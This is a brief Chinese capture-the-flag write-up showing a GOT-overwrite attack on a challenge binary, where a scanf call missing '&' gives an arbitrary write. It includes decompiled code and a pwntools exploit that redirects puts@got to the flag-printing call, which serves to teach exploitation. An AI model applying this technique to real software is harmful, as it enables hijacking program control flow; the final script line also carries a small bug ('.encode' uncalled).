考点 [[GOT 表覆盖]]

程序有 canary 无法溢出。

```c
int check()
{
  int v1; // [esp-8h] [ebp-20h]
  int v2; // [esp-8h] [ebp-20h]
  int v3; // [esp-4h] [ebp-1Ch]
  int v4; // [esp-4h] [ebp-1Ch]
  int v5; // [esp+8h] [ebp-10h]
  int v6; // [esp+Ch] [ebp-Ch]

  printf("Now try the First password : ");
  __isoc99_scanf("%d", v5, v1, v3);
  fflush(stdin);
  printf("Now try the Second password : ");
  __isoc99_scanf("%d", v6, v2, v4);
  puts("Let me think......");
  if ( v5 != 0x528E6 || v6 != 0xCC07C9 )
  {
    puts("You Failed! Try again.");
    exit(0);
  }
  puts("OMG!YOU SUCCESS!");
  return system("/bin/cat flag");
}
```

注意：scanf 的第二个参数没有取地址 &，说明可以任意指针写，劫持 puts@got 为 backdoor 即可。

```py
from pwn import *
from sys import argv

leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

proc = "Wal1et"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("", ) if argv[1] == 'r' else process(proc)

if args.G:
    gdb.attach(io, "b *0x8048845")

io.recvuntil(b"2.EXIT")
io.sendline(str(1).encode())
io.recvuntil(b": ", drop=True)

payload1 = b'a' * 104 + p32(elf.got['puts'])
system_addr = 0x804872A
io.sendline(payload1)
io.recvuntil(b": ", drop=True)
io.sendline(str(system_addr).encode)

io.interactive()
```